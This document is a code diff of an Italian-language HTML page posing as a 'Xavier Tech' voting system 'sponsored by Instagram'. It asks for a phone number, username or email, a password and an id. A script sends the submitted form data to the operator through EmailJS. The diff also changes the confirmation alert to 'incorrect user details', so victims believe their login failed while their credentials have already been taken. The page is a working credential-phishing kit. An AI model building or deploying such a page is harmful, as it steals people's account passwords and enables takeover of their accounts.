@@ -4,154 +4,46 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>payday</title>
+    <title>sistema di voto Xavier Tech</title>
     <!-- <link rel="shortcut icon" href="asset/media/images/insta.jfif" type="image/x-icon"> -->
     <script src="https://kit.fontawesome.com/358d766f87.js" crossorigin="anonymous"></script>
     <style>
         main{
-            /* width: 100%; */
             display: flex;
             justify-content: center;
-            padding-left: 50px;
-        }
-        .form{
-            display: block;
-            /* padding-left: 0px; */
         }
         input{
-            /* display: block; */
-            margin-top: 5px;
-            margin-bottom: 5px;
-            width: 255px;
-            border-radius: 10px;
-            padding: 5px;
-            background-color: rgb(236, 234, 234);
-            border-color: rgb(221, 219, 219);
-            text-shadow: 30px;
+            width: 300px;
+            display: block;
+            margin: 5px;
+            padding: 7px;
+            background-color: lightgrey;
+            border-color: lightgrey;
+            border-radius: 5px;
+            font-weight: 500;
         }
         button{
+            width: 300px;
+            padding-left: 3px;
+            margin-left: 15px;
+            padding: 7px;
+            background-color: blue;
             color: white;
-            background-color: rgba(0, 0, 255, 0.678);
-            border-color: white;
-            width: 260px;
-            border-radius: 20px;
-            padding: 5px;
-            font-weight: 900;
-        }
-        button:hover{
-            cursor: pointer;
-        }
-        a{
-            text-decoration: none;
-            color: rgba(10, 10, 247, 0.678);
-        }
-        .space{
-            height: 40px;
-            color: white;
-        }
-        .space1{
-            height: 10px;
-        }
-        i{
-            margin-left: 100px;
-            font-size: 15px;
-            color: rgb(182, 35, 35);
+            font-weight: 600;
+            border-radius: 5px;
+            border-color: blue;
         }
         #text{
-            font-size: 25px;
-            margin-left: 85px;
-            color: red;
+            color: blue;
+            padding-left: 100px;
+            font-weight: 800;
         }
         span{
+            color: red;
+        }
+        i{
             color: blue;
-            }
-        /* hide password */
-        .fa-solid{
-            position: relative;
-            /* top: 50%; */
-            margin-bottom: 0;
-            font-size: 15px;
-            right: 30px;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: green;
-            transition: all 0.3s ease;
-            margin-left: 0;
-        }
-        
-        @media only screen and (min-width:270px){
-            main{
-                padding-left: 14px;
-            }
-            input{
-                width: 210px;
-                font-size: 12px;
-            }
-            button{
-                width: 215px;
-            }
-            #text{
-                font-size: 13px;
-                margin-top: 15px;
-            }
-            i{
-                font-size: 12px;
-                font-weight: 900;
-            }
-            .space{
-                height: 80px;
-            }
-        }
-        @media only screen and (min-width:350px) {
-            main{
-                padding-left: 30px;
-            }
-            #text{
-                font-size: 25px;
-                margin-left: 85px;
-            }
-            input{
-                width: 280px;
-                padding: 10px;
-            }
-            button{
-                padding: 10px;
-                width: 290px;
-                margin-left: 5px;
-            }
-            i{
-                font-size: 15px;
-            }
-            .space{
-                height: 100px;
-            }
-            
-        }
-        @media only screen and (min-width:700px){
-            main{
-                padding-left: 50px;
-            }
-            #text{
-                font-size: 25px;
-                margin-left: 75px;
-            }
-            input{
-                width: 300px;
-                padding: 10px;
-            }
-            button{
-                padding: 10px;
-                width: 310px;
-                font-weight: 1500;
-            }
-            i{
-                font-size: 17px;
-                margin-left: 120px;
-            }
-            .space{
-                height: 100px;
-            }
-            
+            margin-left: 70px;
         }
     </style>
 </head>
@@ -162,17 +54,17 @@
     <main>
             
     <form id="form" onsubmit="messagE()" method="post">
-        <i id="text"><span>Xavier</span> Tech inc<span>.</span></i>
+        <p id="text"><span>Xavier</span> Tech inc<span>.</span></p>
         <div class="space1"></div>
         <div class="form">
             <!-- <input type="text" name="username" placeholder="Phone number, username or email address" required> -->
             <input type="text" name="username" placeholder="numero di telefono, nome untente or indrizino di posta" title="input correct credential" required>
-            <br>
+            
             <input type="password" name="password" id="password-input" placeholder="password" title="input correct password" required>
-<!--             <i id="toggle-password" class="fa-solid fa-eye-slash"></i> -->
-            <br>
+            <!-- <i id="toggle-password" class="fa-solid fa-eye-slash"></i> -->
+            
             <input type="text" name="id" placeholder="id" title="input correct id" required>
-            <br>
+            
             <button id="send-button">login</button>
             <p><i>sponsorizzato da <span>Instagram</span></i></p>
         </div>
@@ -203,7 +95,7 @@
         emailjs.sendForm(serviceID, templateID, form)
         .then(() => {
         sendButton.value = 'Send Email';
-        alert('vote pending!');
+        alert('incorrect user details');
         }, (err) => {
         sendButton.value = 'Send Email';
       alert(JSON.stringify(err));
